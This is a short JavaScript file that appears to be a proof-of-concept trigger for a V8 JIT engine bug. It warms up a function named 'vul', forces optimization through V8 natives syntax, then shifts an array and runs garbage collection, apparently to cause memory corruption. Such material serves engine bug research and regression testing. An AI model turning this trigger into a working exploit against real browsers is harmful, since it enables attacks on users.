function vul() {
    const arr = Array(1000);
    function inlined_func() {
        try {
            const err_obj = { e: p4nda, length: arr };
        } catch(e9) {
            return e9;
        }
    }
    for (let i11 = 0; i11 < 25; i11++) {
        inlined_func();
    }
    var res = inlined_func();
    const v20 = {};
    /p4nda/.test(v20);
    arr.shift();
    return res;
}
const v25 = %PrepareFunctionForOptimization(vul);
const v24 = v25;
vul();
vul();
const v29 = %OptimizeFunctionOnNextCall(vul);
const v27 = v29;
var res = vul();
gc();
gc();
